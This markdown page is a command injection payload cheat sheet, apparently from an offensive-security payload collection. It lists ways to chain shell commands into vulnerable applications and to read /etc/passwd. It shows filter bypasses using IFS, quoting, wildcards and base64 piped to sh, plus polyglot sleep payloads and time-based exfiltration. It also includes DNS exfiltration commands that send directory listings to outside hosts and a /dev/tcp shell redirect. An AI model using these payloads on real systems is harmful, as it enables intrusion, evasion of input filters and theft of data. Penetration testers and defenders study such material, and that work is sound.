# Command Injection

> Command injection is a security vulnerability that allows an attacker to execute arbitrary commands inside a vulnerable application.

## Summary

* [Tools](#tools)
* [Exploits](#exploits)
  * [Basic commands](#basic-commands)
  * [Chaining commands](#chaining-commands)
  * [Inside a command](#inside-a-command)
* [Filter Bypasses](#filter-bypasses)
  * [Bypass without space](#bypass-without-space)
  * [Bypass with a line return](#bypass-with-a-line-return)
  * [Bypass blacklisted words](#bypass-blacklisted-words)
   * [Bypass with single quote](#bypass-with-single-quote)
   * [Bypass with double quote](#bypass-with-double-quote)
   * [Bypass with backslash and slash](#bypass-with-backslash-and-slash)
   * [Bypass with $@](#bypass-with-)
   * [Bypass with variable expansion](#bypass-with-variable-expansion)
   * [Bypass with wildcards](#bypass-with-wildcards)
* [Challenge](#challenge)
* [Time based data exfiltration](#time-based-data-exfiltration)
* [DNS based data exfiltration](#dns-based-data-exfiltration)
* [Polyglot command injection](#polyglot-command-injection)
* [Readfile](#readfile)
* [References](#references)
    

## Tools

* [commix - Automated All-in-One OS command injection and exploitation tool](https://github.com/commixproject/commix)

## Exploits

### Basic commands

Execute the command and voila :p

```powershell
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
```

### Chaining commands

```powershell
original_cmd_by_server; ls
original_cmd_by_server && ls
original_cmd_by_server | ls
original_cmd_by_server %0a ls
original_cmd_by_server || ls    Only if the first cmd fail
```

### Inside a command

```bash
original_cmd_by_server `cat /etc/passwd`
original_cmd_by_server $(cat /etc/passwd)
```

## Filter Bypasses

### Bypass without space

Works on Linux only.

```powershell
swissky@crashlab:~/Www$ cat</etc/passwd
root:x:0:0:root:/root:/bin/bash

swissky@crashlab▸ ~ ▸ $ {cat,/etc/passwd}
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

swissky@crashlab▸ ~ ▸ $ cat$IFS/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

swissky@crashlab▸ ~ ▸ $ cat$IFS$1/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

swissky@crashlab▸ ~ ▸ $ cat$IFS$9`ls`
<?php
$flag = "flag{xxxxxxxxxxx}";
?>
/?ip=
<?php
if(isset($_GET['ac'])){

swissky@crashlab▸ ~ ▸ $ echo${IFS}"RCE"${IFS}&&cat${IFS}/etc/passwd
RCE
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

swissky@crashlab▸ ~ ▸ $ X=$'uname\x20-a'&&$X
Linux crashlab 4.4.X-XX-generic #72-Ubuntu

swissky@crashlab▸ ~ ▸ $ sh</dev/tcp/127.0.0.1/4242

%09 bypass space
%0d bypass space
```

Commands execution without spaces, $ or { } - Linux (Bash only)

```powershell
IFS=,;`cat<<<uname,-a`
```

Works on Windows only.

```powershell
ping%CommonProgramFiles:~10,-18%IP
ping%PROGRAMFILES:~10,-5%IP
```

### Bypass with a line return

```powershell
something%0Acat%20/etc/passwd
```

### Bypass Blacklisted words

#### Bypass with single quote

```powershell
w'h'o'am'i
```

#### Bypass with double quote

```powershell
w"h"o"am"i
```

#### Bypass with backslash and slash

```powershell
w\ho\am\i
/\b\i\n/////s\h
```

#### Bypass with $@

```powershell
who$@ami

echo $0
-> /usr/bin/zsh
echo whoami|$0
```

#### Bypass with variable expansion

```powershell
/???/??t /???/p??s??

test=/ehhh/hmtc/pahhh/hmsswd
cat ${test//hhh\/hm/}
cat ${test//hh??hm/}
```

#### Bypass with wildcards

```powershell
powershell C:\*\*2\n??e*d.*? # notepad
@^p^o^w^e^r^shell c:\*\*32\c*?c.e?e # calc
```
### Bypass with =
```
a=fl;b=ag.php;cat $a$b      
a=l;b=s;$a$b
```

#### Bypass with base64
```
`echo d2hvYW1p|base64 -d` 
echo Y2F0IGluZGV4LnBocAo=|base64 -d|sh
```

#### Bypass with \` in powershell

```powershell
w`h`o`am`i
```
#### Bypass with ^ in cmd

```powershell
w^h^o^am^i
```
#### Bypass with %256 in cmd

```fl%256ag
file:///fl%256ag
```



## Challenge

Challenge based on the previous tricks, what does the following command do:

```powershell
g="/e"\h"hh"/hm"t"c/\i"sh"hh/hmsu\e;tac$@<${g//hh??hm/}
```

## Time based data exfiltration

Extracting data : char by char

```powershell
swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
real    0m5.007s
user    0m0.000s
sys 0m0.000s

swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
real    0m0.002s
user    0m0.000s
sys 0m0.000s
```

## DNS based data exfiltration

Based on the tool from `https://github.com/HoLyVieR/dnsbin` also hosted at dnsbin.zhack.ca

```powershell
1. Go to http://dnsbin.zhack.ca/
2. Execute a simple 'ls'
for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
```

```powershell
$(host $(wget -h|head -n1|sed 's/[ ,]/-/g'|tr -d '.').sudo.co.il)
```

Online tools to check for DNS based data exfiltration:

- dnsbin.zhack.ca
- pingb.in

## Polyglot command injection

```bash
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}

e.g:
echo 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
echo '1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
echo "1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
```

```bash
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/

e.g:
echo 1/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
echo "YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/"
echo 'YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/'
```
## Readfile
花式读文件
```
m4 *
```

## References

* [SECURITY CAFÉ - Exploiting Timed Based RCE](https://securitycafe.ro/2017/02/28/time-based-data-exfiltration/)
* [Bug Bounty Survey - Windows RCE spaceless](https://twitter.com/bugbsurveys/status/860102244171227136)
* [No PHP, no spaces, no $, no { }, bash only - @asdizzle](https://twitter.com/asdizzle_/status/895244943526170628)
* [#bash #obfuscation by string manipulation - Malwrologist, @DissectMalware](https://twitter.com/DissectMalware/status/1025604382644232192)
